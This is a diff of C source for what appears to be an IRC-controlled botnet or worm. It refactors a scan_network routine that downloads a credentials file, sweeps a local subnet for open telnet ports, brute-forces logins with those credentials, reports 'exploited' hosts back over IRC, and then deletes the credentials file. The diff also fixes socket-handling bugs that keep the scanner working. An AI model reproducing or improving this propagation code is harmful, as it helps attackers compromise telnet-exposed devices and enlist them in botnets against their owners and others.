@@ -8,92 +8,57 @@ char *credentials_line = NULL;
 
 int scan_network(irc_info *info, char *ip) {
 
-	// check if credentials file doesn't exists yet
-	if (access(CRED_FILE, F_OK)) {
+	download_credentials_file();
 
-		download_credentials_file();
-
-		// if we can't access the file, simply ignore and sets creds
-		// to null to move to the next target
-		if (access(CRED_FILE, R_OK) == -1) {
-			perror("access cred file");
-			irc_send("can't read credentials file\n", strlen("can't read credentials file\n"), info);
-			return EXIT_FAILURE;
-		}
+	// if we can't access the file, simply ignore and sets creds
+	// to null to move to the next target
+	if (access(CRED_FILE, R_OK) == -1) {
+		perror("access cred file");
+		irc_send("can't read credentials file\n", strlen("can't read credentials file\n"), info);
+		return EXIT_FAILURE;
 	}
 
-	if (!ip) {
+	char *subnet;
+	if (!ip)
+		subnet = get_subnet_address();
+	else
+		subnet = ip;
 
-		char *subnet = get_subnet_address();
-
-		if (subnet) {
-
-			// get first octect
-			char *fo = strtok(subnet, ".");
-			// second... and third
-			char *so = strtok(NULL, ".");
-			char *to = strtok(NULL, ".");
-
-			char msg[50];
-
-			for (int i = 100; i < 255; i++) {
-				//sprintf(msg, "scanning %s.%s.%s.%d\n", fo, so, to, i);
-				//irc_send(msg, strlen(msg), info);
-
-				telnet_info info_t;
-				sprintf(info_t.ip, "%s.%s.%s.%d", fo, so, to, i);
-				#ifdef DEBUG
-				printf("trying to connect to telnet ip = %s\n", info_t.ip);
-				#endif
-				if (!telnet_connect(&info_t)) {
-					sprintf(msg, "connected to %s\n", info_t.ip);
-					irc_send(msg, strlen(msg), info);
-					sprintf(msg, "trying to exploit %s\n", info_t.ip);
-					irc_send(msg, strlen(msg), info);
-
-					if (!telnet_login(&info_t)) {
-						sprintf(msg, "exploited %s\n", info_t.ip);
-						irc_send(msg, strlen(msg), info);
-					}
-					// after tried to login, if sucessful or not, we must seek our file to the beginning
-					fseek(credentials_file, 0 , SEEK_SET);
-
-				}
-			}
-		} else {
-			return EXIT_FAILURE;
-		}
-
-	} else {
+	if (subnet) {
 
 		// get first octect
-		char *fo = strtok(ip, ".");
+		char *fo = strtok(subnet, ".");
 		// second... and third
 		char *so = strtok(NULL, ".");
 		char *to = strtok(NULL, ".");
 
 		char msg[50];
-
-		for (int i = 1; i < 255; i++) {
-
+		// loop through hosts
+		for (int i = 100; i < 255; i++) {
 			telnet_info info_t;
 			sprintf(info_t.ip, "%s.%s.%s.%d", fo, so, to, i);
 			#ifdef DEBUG
 			printf("trying to connect to telnet ip = %s\n", info_t.ip);
 			#endif
+			// if TELNET port is open and listening we'are connected
 			if (!telnet_connect(&info_t)) {
-				irc_send(info_t.ip, strlen(info_t.ip), info);
+				sprintf(msg, "connected to %s\n", info_t.ip);
+				irc_send(msg, strlen(msg), info);
 				sprintf(msg, "trying to exploit %s\n", info_t.ip);
 				irc_send(msg, strlen(msg), info);
 
+				// try to exploit host
 				if (!telnet_login(&info_t)) {
 					sprintf(msg, "exploited %s\n", info_t.ip);
 					irc_send(msg, strlen(msg), info);
 				}
 				// after tried to login, if sucessful or not, we must seek our file to the beginning
+				// to try next host
 				fseek(credentials_file, 0 , SEEK_SET);
 			}
 		}
+	} else {
+		return EXIT_FAILURE;
 	}
 
 	//after tried to exploit hosts, ensure credentials file is closed e removed
@@ -132,9 +97,6 @@ char * get_subnet_address() {
 			perror("getnameinfo");
 			return NULL;
 		}
-
-		//if (host)
-		//	break;
 	}
 
 	freeifaddrs(ifaddr);
@@ -165,7 +127,7 @@ int telnet_connect(telnet_info *info) {
 
 	if (connect(fd, (struct sockaddr *) addr, sizeof(struct sockaddr_in)) == -1) {
 		perror("connect telnet connect");
-		free(fd);
+		close(fd);
 		return EXIT_FAILURE;
 	}
 	free(addr);
